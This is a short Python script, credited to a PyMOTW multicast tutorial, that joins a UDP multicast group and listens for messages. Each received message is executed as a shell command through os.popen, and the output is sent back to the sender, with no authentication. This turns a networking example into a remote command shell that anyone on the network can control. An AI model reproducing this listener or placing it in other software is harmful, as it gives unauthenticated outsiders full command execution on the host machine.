# https://pymotw.com/2/socket/multicast.html

import socket
import struct
import sys

import os

multicast_group = '224.3.29.73'
server_address = ('', 10001)

# Create the socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Bind to the server address
sock.bind(server_address)

# Tell the operating system to add the socket to the multicast group
# on all interfaces.
group = socket.inet_aton(multicast_group)
mreq = struct.pack('4sL', group, socket.INADDR_ANY)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

# Receive/respond loop
while True:
    # print(sys.stderr, '\nwaiting to receive message')
    print('\nwaiting to receive message')
    data, address = sock.recvfrom(1024)
    
    #print(sys.stderr, 'received %s bytes from %s' % (len(data), address))
    print('received %s bytes from %s' % (len(data), address))

    #print(sys.stderr, data)
    print("executing: ", data)
    
    stream = os.popen(data.decode())
    output = stream.read()
    print(output)

    #os.system(data)
    
    print(sys.stderr, 'sending acknowledgement to', address)
    print('sending acknowledgement to', address)
    sock.sendto(output.encode(), address)

#print (sys.stderr, 'closing socket')
print ('closing socket')
sock.close()